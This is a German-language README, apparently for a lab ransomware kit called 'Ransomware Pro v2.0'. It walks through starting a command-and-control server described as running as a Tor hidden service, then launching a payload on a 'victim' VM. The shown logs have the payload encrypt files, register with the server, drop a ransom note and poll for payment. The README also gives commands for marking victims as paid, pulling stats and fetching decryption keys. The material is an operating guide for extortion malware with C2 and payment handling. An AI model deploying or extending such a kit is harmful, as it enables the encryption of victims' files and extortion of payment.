# RANSOMWARE PRO - VM STANDALONE (OHNE PIP!)

## 🚀 Auf der VICTIM VM - Keine Dependencies nötig!

### **Option 1: Direkter Start (Python 3 erforderlich)**

```bash
python3 launcher_standalone.py 192.168.126.200
```

Oder:

```bash
python launcher_standalone.py 192.168.126.200
```

### **Was passiert:**
1. ✅ Startet ohne pip, ohne externe Libraries
2. ✅ Nutzt nur Python Standard Library (urllib, json, sqlite3)
3. ✅ Scannt & verschlüsselt Dateien
4. ✅ Registriert sich bei C2 Server
5. ✅ Wartet auf Payment
6. ✅ Automatische Decryption nach Payment

---

## 📋 VOLLSTÄNDIGER TEST-WORKFLOW

### **SCHRITT 1: Auf HOST PC - C2 Server starten**

Terminal 1:
```bash
cd D:\ransomware_pro
python c2_server.py
```

Output:
```
[+] C2 Server starting on Tor hidden service...
 * Running on http://0.0.0.0:5000
```

---

### **SCHRITT 2: Auf VICTIM VM - Standalone Victim starten**

Terminal 2 (VM):
```bash
python launcher_standalone.py 192.168.126.200
```

Output:
```
╔════════════════════════════════════════════════════════════╗
║  RANSOMWARE PRO v2.0 - STANDALONE PAYLOAD                 ║
║  Server: 192.168.126.200:5000                             ║
╚════════════════════════════════════════════════════════════╝

[12:34:56] [*] Ransomware initialized: abc123def456
[12:34:57] [*] PHASE 1: Scanning for files...
[12:34:58] [✓] Encrypted 15 files (12.50 MB)
[12:34:59] [*] Registering with C2...
[12:35:00] [✓] Registered: abc123def456
[12:35:01] [+] Ransom note written to Desktop
[12:35:02] [*] Starting payment monitoring...
```

---

### **SCHRITT 3: Auf HOST PC - Payment simulieren**

Terminal 3 (HOST):
```bash
# Markiere Payment als empfangen
python -c "
import sqlite3
conn = sqlite3.connect('C:\\\\ransomware\\\\victims.db')
cursor = conn.cursor()
cursor.execute(\"UPDATE victims SET payment_received = 1, status = 'PAID' WHERE status = 'INFECTED'\")
conn.commit()
print('[+] Payment marked!')
"
```

---

### **SCHRITT 4: Warte auf VM - Auto-Decryption!**

Auf der VM sollte jetzt automatisch passieren:
```
[12:35:30] [*] Starting payment monitoring...
[12:36:00] [!] PAYMENT DETECTED!
[12:36:01] [*] DECRYPTION PHASE: Decrypting all files...
[12:36:05] [✓] Decrypted 15 files!
```

---

## 🎯 SCHNELLE COMMANDS

**Victim starten:**
```bash
python launcher_standalone.py 192.168.126.200
```

**Stats checken (HOST):**
```bash
curl http://localhost:5000/api/v1/admin/stats
```

**Payment simulieren (HOST):**
```bash
python -c "import sqlite3; conn=sqlite3.connect('C:\\\\ransomware\\\\victims.db'); cursor=conn.cursor(); cursor.execute(\"UPDATE victims SET payment_received = 1, status = 'PAID'\"); conn.commit()"
```

**Decryption testen (HOST):**
```bash
curl http://localhost:5000/api/v1/decryption/key/VICTIM_ID_HERE
```

---

## ✅ ANFORDERUNGEN

- ✅ Python 3.6+ (Standard auf Linux/Mac/Windows)
- ✅ KEIN pip erforderlich
- ✅ KEINE externen Libraries
- ✅ Nur Python Standard Library

---

## 🔐 WICHTIG

- `standalone_victim.py` nutzt einfaches XOR für Demo (nicht produktiv sicher)
- Für echte Tests: Testdateien in `~\Documents` etc. erstellen
- Payment-Check läuft alle 30 Sekunden
- Decryption ist automatisch nach Payment-Verification

---

**Ready?** 🚀
1. HOST: `python c2_server.py`
2. VM: `python launcher_standalone.py 192.168.126.200`
3. HOST: Payment simulieren
4. VM: Auto-Decryption! ✓
